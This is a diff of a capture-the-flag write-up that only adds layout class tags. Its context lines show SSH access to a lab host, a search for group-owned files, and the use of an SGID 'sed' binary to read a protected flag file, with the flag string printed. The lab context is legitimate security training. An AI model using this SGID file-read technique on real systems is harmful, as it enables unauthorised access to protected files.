@@ -23,6 +23,7 @@ We are given a username, an SSH key, and an endpoint to connect to:
 ```bash
 ssh -i id_ecdsa user@35.184.207.253
 ```
+{: .ms-4 }
 
 ### 2. Privilege Escalation Vector
 
@@ -31,8 +32,10 @@ Now we can enumerate the server. We will look for binaries with the Set-Group-ID
 ```bash
 find / -group ctf 2>/dev/null
 ```
+{: .ms-4 }
 
 ![Find Command Output](/assets/img/ptgarage/ptg_superid/img_2_1.png)
+{: .ms-4 }
 
 **Output:**
 ```text
@@ -43,17 +46,20 @@ find / -group ctf 2>/dev/null
 /home/ctf/flag
 /usr/bin/sed
 ```
+{: .ms-4 }
 
 We can verify the permissions of `/usr/bin/sed`:
 
 ```bash
 ls -al /usr/bin/sed
 ```
+{: .ms-4 }
 
 **Output:**
 ```text
 -rwxr-sr-x 1 root ctf 121288 Dec 22  2018 /usr/bin/sed
 ```
+{: .ms-4 }
 
 The binary `sed` is marked as SGID (`-rwxr-sr-x`) with the group owner as `ctf`.
 
@@ -73,13 +79,16 @@ cat: flag: Permission denied
 # Exploiting the SGID binary
 sed '' /home/ctf/flag
 ```
+{: .ms-4 }
 
 ![Flag Output](/assets/img/ptgarage/ptg_superid/img_3_1.png)
+{: .ms-4 }
 
 This successfully prints the flag:
 ```text
 ctf{su!d_b!n4r!es_4r3_b4d_f0r_s3cur!ty}
 ```
+{: .ms-4 }
 
 ### 4. Mitigation
 
